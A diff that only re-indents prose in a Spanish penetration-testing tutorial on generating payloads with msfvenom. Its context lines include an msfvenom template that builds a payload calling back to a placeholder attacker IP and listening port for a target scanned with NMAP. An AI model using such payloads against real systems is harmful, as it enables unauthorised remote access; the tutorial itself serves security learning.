@@ -30,7 +30,7 @@ msfvenom -h
 ```
 </b>
 
-Si queremos disponer de un listado con los posibles opciones y/o payloads, podemos utilizar el siguientes códigos:
+    Si queremos disponer de un listado con los posibles opciones y/o payloads, podemos utilizar el siguientes códigos:
 <b>
 
 ```
@@ -52,8 +52,8 @@ msfvenom -p [payload_elegido] LHOST=[ip_atacante] LPORT=[puerto_escucha_atacante
 ```
 </b>
 
-Como es evidente, se pueden dar ocasiones en las que se deba crear un payload "a medida" para el sistema operativo que está en el host objetivo, siempre según los análisis que hemos realizado mediante NMAP.
-Así, podemos crear diversos tipos de payloads:
+    Como es evidente, se pueden dar ocasiones en las que se deba crear un payload "a medida" para el sistema operativo que está en el host objetivo, siempre según los análisis que hemos realizado mediante NMAP.
+    Así, podemos crear diversos tipos de payloads:
 <b>
 
 ```
